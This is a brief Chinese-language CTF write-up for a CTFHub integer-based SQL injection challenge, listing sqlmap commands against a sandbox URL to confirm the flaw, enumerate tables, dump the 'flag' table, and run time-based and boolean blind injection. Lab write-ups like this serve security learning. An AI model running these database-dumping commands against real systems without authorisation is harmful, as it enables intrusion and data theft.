# SQL 整数型注入

```
python .\sqlmap.py -u http://challenge-632e9c308ddda607.sandbox.ctfhub.com:10800/?id=1
```
检查确实有问题

```

python sqlmap.py -u http://challenge-632e9c308ddda607.sandbox.ctfhub.com:10800/?id=1 --tables

```
显示有啥库

```

python .\sqlmap.py -u http://challenge-632e9c308ddda607.sandbox.ctfhub.com:10800/?id=1 --batch --dump -T flag -D sqli
```

拖库



```
 -T flag --columns
```




```
--flush-session --batch  --dbms=mysql --level=5 --risk=3 --technique=T 

```

时间盲注


```
--flush-session --batch  --dbms=mysql --level=5 --risk=3 --technique=B

```
布尔盲注


mysql结构

